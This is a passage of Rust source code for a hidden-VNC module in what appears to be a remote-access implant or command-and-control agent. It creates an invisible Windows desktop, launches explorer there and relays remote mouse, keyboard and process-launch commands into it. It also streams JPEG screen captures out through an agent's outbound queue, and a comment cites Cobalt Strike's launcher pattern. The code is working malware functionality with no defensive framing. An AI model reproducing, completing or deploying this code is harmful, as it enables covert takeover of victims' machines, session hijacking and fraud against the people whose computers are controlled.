                    )
                } else {
                    h
                }
            };

            if h_desk.is_null() {
                return Err("Failed to create hidden desktop".into());
            }

            let running = Arc::new(AtomicBool::new(true));
            let quality = jpeg_quality.clamp(10, 95);
            let desk_ptr = h_desk as usize;

            // Auto-launch explorer with a folder window so there's always something
            // visible, even on a blank desktop or after stop/restart.
            // explorer.exe without args starts the shell (which may silently exit if
            // another shell is detected). Opening a folder guarantees a visible window.
            let user_profile = unsafe { get_env_var("USERPROFILE") };
            let target = if !user_profile.is_empty() {
                user_profile
            } else {
                "C:\\".to_string()
            };
            let explorer_cmd = format!(
                "{}\\explorer.exe \"{}\"",
                unsafe { get_env_var("WINDIR") },
                target
            );
            unsafe {
                launch_on_desktop(&desktop_name_wide, &explorer_cmd);
            }
            // Give explorer time to open the folder window
            std::thread::sleep(std::time::Duration::from_secs(3));

            // Wait for taskbar (Shell_TrayWnd) and force it always-on-top
            // Matches Cobalt Strike's explorer launcher pattern
            unsafe {
                setup_taskbar();
            }

            // Input event — SetEvent wakes capture thread instantly from WaitForSingleObject
            let input_event = unsafe { CreateEventW(std::ptr::null(), 0, 0, std::ptr::null()) };
            if input_event.is_null() {
                return Err("Failed to create input event".into());
            }
            let input_event_ptr = input_event as usize; // safe to send across threads
            let input_event_capture = input_event_ptr;

            // Input dispatch thread
            // The capture output is 960x540 but the actual desktop may be larger.
            // Input coordinates arrive in output (960x540) space and must be scaled
            // to actual desktop resolution for WindowFromPoint / PostMessage.
            let (input_tx, input_rx) = mpsc::channel::<Vec<u8>>();
            let running_input = running.clone();
            let desktop_name_for_input = desktop_name_wide.clone();
            thread::spawn(move || {
                if !unsafe { verify_set_thread_desktop(desk_ptr) } {
                    crate::dbg_print!("[hvnc-input] failed to switch to hidden desktop, aborting");
                    return;
                }

                // Get actual desktop resolution for coordinate scaling
                let desk_w = unsafe { GetSystemMetrics(SM_CXSCREEN) };
                let desk_h = unsafe { GetSystemMetrics(SM_CYSCREEN) };
                let out_w = 960i32.min(desk_w);
                let out_h = 540i32.min(desk_h);
                let scale_x = desk_w as f64 / out_w as f64;
                let scale_y = desk_h as f64 / out_h as f64;
                crate::dbg_print!(
                    "[hvnc-input] thread started, desk={}x{} out={}x{} scale={:.2}x{:.2}",
                    desk_w,
                    desk_h,
                    out_w,
                    out_h,
                    scale_x,
                    scale_y
                );

                // Debug: enumerate windows on this desktop
                unsafe {
                    let top = GetTopWindow(std::ptr::null_mut());
                    crate::dbg_print!("[hvnc-input] GetTopWindow={:?}", top);
                    if !top.is_null() {
                        let mut hwnd = top;
                        let mut wcount = 0;
                        while !hwnd.is_null() && wcount < 20 {
                            let vis = IsWindowVisible(hwnd);
                            let mut wr: RECT = std::mem::zeroed();
                            GetWindowRect(hwnd, &mut wr);
                            crate::dbg_print!(
                                "[hvnc-input] window {:?} vis={} rect=({},{})–({},{})",
                                hwnd,
                                vis,
                                wr.left,
                                wr.top,
                                wr.right,
                                wr.bottom
                            );
                            hwnd = GetWindow(hwnd, 2); // GW_HWNDNEXT
                            wcount += 1;
                        }
                    }
                    // Also check WindowFromPoint at center
                    let center = POINT {
                        x: desk_w / 2,
                        y: desk_h / 2,
                    };
                    let wfp = WindowFromPoint(center);
                    crate::dbg_print!(
                        "[hvnc-input] WindowFromPoint({},{})={:?}",
                        center.x,
                        center.y,
                        wfp
                    );
                    // Check GetDesktopWindow
                    let dw = GetDesktopWindow();
                    crate::dbg_print!("[hvnc-input] GetDesktopWindow={:?}", dw);
                }

                let mut focused: *mut c_void = std::ptr::null_mut();
                let mut dbl = DblClickState::new();
                let mut kb_state = [0u8; 256]; // persistent keyboard state tracker

                while running_input.load(Ordering::Relaxed) {
                    match input_rx.recv_timeout(std::time::Duration::from_millis(100)) {
                        Ok(data) => {
                            if data.is_empty() {
                                continue;
                            }
                            // Wake capture thread instantly via Windows Event
                            unsafe {
                                SetEvent(input_event_ptr as *mut c_void);
                            }
                            match data[0] {
                                INPUT_MSG if data.len() >= 13 => {
                                    let msg =
                                        u32::from_le_bytes([data[1], data[2], data[3], data[4]]);
                                    let wparam =
                                        u32::from_le_bytes([data[5], data[6], data[7], data[8]]);
                                    let raw_lparam =
                                        u32::from_le_bytes([data[9], data[10], data[11], data[12]]);
                                    // Scale coordinates from output space to desktop space
                                    let raw_x = (raw_lparam & 0xFFFF) as i16 as f64;
                                    let raw_y = ((raw_lparam >> 16) & 0xFFFF) as i16 as f64;
                                    let scaled_x = (raw_x * scale_x).round() as i32;
                                    let scaled_y = (raw_y * scale_y).round() as i32;
                                    let scaled_lparam = ((scaled_y as u32 & 0xFFFF) << 16)
                                        | (scaled_x as u32 & 0xFFFF);
                                    unsafe {
                                        dispatch_input(
                                            msg,
                                            wparam as usize,
                                            scaled_lparam as i32 as isize,
                                            desk_w,
                                            desk_h,
                                            &mut focused,
                                            &mut dbl,
                                            &desktop_name_for_input,
                                            &mut kb_state,
                                        );
                                    }
                                }
                                CONTROL_MSG if data.len() >= 5 => {
                                    let action =
                                        u32::from_le_bytes([data[1], data[2], data[3], data[4]]);
                                    launch_process(&desktop_name_for_input, action);
                                }
                                _ => {}
                            }
                        }
                        Err(mpsc::RecvTimeoutError::Timeout) => continue,
                        Err(_) => break,
                    }
                }
            });

            // Capture thread — the hot loop
            let running_capture = running.clone();
            thread::spawn(move || {
                if !unsafe { verify_set_thread_desktop(desk_ptr) } {
                    crate::dbg_print!(
                        "[hvnc-capture] failed to switch to hidden desktop, aborting"
                    );
                    return;
                }

                // Lower resolution = faster PrintWindow + JPEG encode + smaller data
                let mut ctx = match unsafe { CaptureCtx::new(960, 540) } {
                    Some(c) => c,
                    None => {
                        crate::dbg_print!("[hvnc] failed to init capture context");
                        return;
                    }
                };

                let mut prev_hash: u32 = 0;
                let mut send_idx: i32 = 0;
                let mut idle_count: u32 = 0;
                let mut frame_count: u64 = 0;
                let mut burst_frames: u32 = 0; // Frames remaining in input burst mode
                let mut fps_timer = std::time::Instant::now();
                let mut fps_frames_sent: u32 = 0;
                let mut fps_frames_captured: u32 = 0;
                let mut fps_inputs: u32 = 0;

                crate::dbg_print!(
                    "[hvnc-capture] thread started, desk={}x{} out={}x{}",
                    ctx.desk_w,
                    ctx.desk_h,
                    ctx.out_w,
                    ctx.out_h
                );

                let evt = input_event_capture as *mut c_void;

                // Whether the input event was signaled (set by input thread on each input)
                let mut input_signaled = false;

                while running_capture.load(Ordering::Relaxed) {
                    // FPS monitor — log every second
                    if fps_timer.elapsed().as_secs() >= 1 {
                        crate::dbg_print!(
                            "[hvnc-fps] sent={} captured={} inputs={} idle={}",
                            fps_frames_sent,
                            fps_frames_captured,
                            fps_inputs,
                            idle_count
                        );
                        fps_frames_sent = 0;
                        fps_frames_captured = 0;
                        fps_inputs = 0;
                        fps_timer = std::time::Instant::now();
                    }

                    // If input was signaled (from previous wait or explicit check), start burst
                    if input_signaled {
                        idle_count = 0;
                        burst_frames = 10;
                        input_signaled = false;
                        fps_inputs += 1;
                    }

                    // Force repaint during burst — hidden desktop windows don't
                    // repaint automatically (no DWM composition)
                    let force_repaint = burst_frames > 0;
                    let changed = unsafe { ctx.capture(&mut prev_hash, force_repaint) };

                    frame_count += 1;

                    if changed {
                        idle_count = 0;
                    } else {
                        idle_count = idle_count.saturating_add(1);
                    }

                    fps_frames_captured += 1;

                    // Only send changed frames or during burst; keepalive every 3 sec
                    // to avoid flooding HTTPS with identical 17KB frames
                    let should_send = changed || burst_frames > 0 || idle_count % 30 == 0;
                    if !should_send {
                        continue;
                    }

                    if let Some(jpeg) = encode_jpeg(
                        &ctx.pixel_buf,
                        &mut ctx.flip_buf,
                        ctx.out_w,
                        ctx.out_h,
                        quality,
                    ) {
                        let mut data = Vec::with_capacity(9 + jpeg.len());
                        data.push(FRAME_JPEG);
                        data.extend_from_slice(&(ctx.out_w as u32).to_le_bytes());
                        data.extend_from_slice(&(ctx.out_h as u32).to_le_bytes());
                        data.extend_from_slice(&jpeg);

                        let queued = if let Ok(mut q) = outbound.lock() {
                            q.push(SocksOut {
                                conn_id,
                                agent_id,
                                index: send_idx,
                                job_id: Uuid::new_v4().to_string(),
                                token: Uuid::nil(),
                                data,
                                close: false,
                            });
                            q.len()
                        } else {
                            0
                        };
                        send_idx += 1;
                        fps_frames_sent += 1;
                        if send_idx <= 10 || send_idx % 100 == 0 {
                            crate::dbg_print!(
                                "[hvnc-capture] queued frame idx={} jpeg={}B q_len={} idle={}",
                                send_idx - 1,
                                jpeg.len(),
                                queued,
                                idle_count
                            );
                        }
                        wake.notify();
                    }

                    // Adaptive timing:
                    //   burst (after input): 5ms — rapid frames for visual feedback
                    //   active (recent change): 33ms — ~30fps
                    //   idle: 100ms — ~10fps base rate to keep stream alive
                    if burst_frames > 0 {
                        burst_frames -= 1;
                        unsafe {
                            Sleep(5);
                        }
                    } else {
                        let wait_ms = if idle_count > 10 { 100 } else { 33 };
                        let ret = unsafe { WaitForSingleObject(evt, wait_ms) };
                        if ret == 0 {
                            // WAIT_OBJECT_0 — input event signaled
                            input_signaled = true;
                        }
                    }
                }

                // Send close packet
                if let Ok(mut q) = outbound.lock() {
                    q.push(SocksOut {
                        conn_id,
                        agent_id,
                        index: send_idx,
                        job_id: Uuid::new_v4().to_string(),
                        token: Uuid::nil(),
                        data: vec![],
                        close: true,
                    });
                }
                unsafe {
                    ctx.cleanup();
                    CloseDesktop(desk_ptr as *mut c_void);
                }
            });

            crate::dbg_print!(
                "[hvnc] session started, conn_id={}, desktop={}",
                conn_id,
                desktop_name
            );

            Ok(HvncSession {
                conn_id,
                desktop_name_wide,
                h_desk,
                capture_running: running,
                agent_id,
                input_tx,
                input_event,
            })
        }

        pub fn handle_input(&self, data: &[u8]) {
            if data.is_empty() {
                return;
            }
            let _ = self.input_tx.send(data.to_vec());
        }

        pub fn stop(self) {
            crate::dbg_print!("[hvnc] session stopped, conn_id={}", self.conn_id);
            self.capture_running.store(false, Ordering::Relaxed);
        }
    }

    impl Drop for HvncSession {
        fn drop(&mut self) {
            self.capture_running.store(false, Ordering::Relaxed);
            if !self.input_event.is_null() {
                unsafe {
                    CloseHandle(self.input_event);
                }
            }
        }
    }
}
